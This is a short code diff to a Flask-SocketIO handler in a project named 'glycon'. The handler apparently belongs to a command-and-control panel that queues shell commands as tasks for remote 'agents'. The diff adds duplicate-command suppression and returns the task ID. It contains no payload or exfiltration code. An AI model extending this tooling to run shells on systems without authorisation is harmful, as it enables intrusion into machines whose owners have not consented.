@@ -1,4 +1,5 @@
 ﻿from flask_login import current_user
+from flask_socketio import SocketIO, join_room, leave_room, emit
 from glycon.config import CONFIG
 import sqlite3
 from datetime import datetime
@@ -22,6 +23,13 @@ def init_socket_handlers(socketio):
     @socketio.on('terminal_command')
     def handle_terminal_command(data):
         try:
+            # Check if this is a duplicate command from client-side reconnection
+            if hasattr(handle_terminal_command, 'last_command') and \
+            handle_terminal_command.last_command == (data['agent_id'], data['command']):
+                return
+                
+            handle_terminal_command.last_command = (data['agent_id'], data['command'])
+            
             conn = sqlite3.connect(CONFIG.database)
             c = conn.cursor()
             
@@ -31,8 +39,8 @@ def init_socket_handlers(socketio):
             }
             
             c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
-                     (None, data['agent_id'], 'shell', json.dumps(task_data),
-                      'pending', datetime.now().isoformat(), None))
+                    (None, data['agent_id'], 'shell', json.dumps(task_data),
+                    'pending', datetime.now().isoformat(), None))
             
             conn.commit()
             task_id = c.lastrowid
@@ -41,8 +49,10 @@ def init_socket_handlers(socketio):
             emit('terminal_output', {
                 'agent_id': data['agent_id'],
                 'command': data['command'],
-                'output': f"[+] Command queued (Task ID: {task_id})"
+                'output': f"[+] Command queued (Task ID: {task_id})",
+                'task_id': task_id  # Include task_id in response
             }, room=f"terminal_{data['agent_id']}")
+            
         except Exception as e:
             emit('terminal_output', {
                 'agent_id': data['agent_id'],
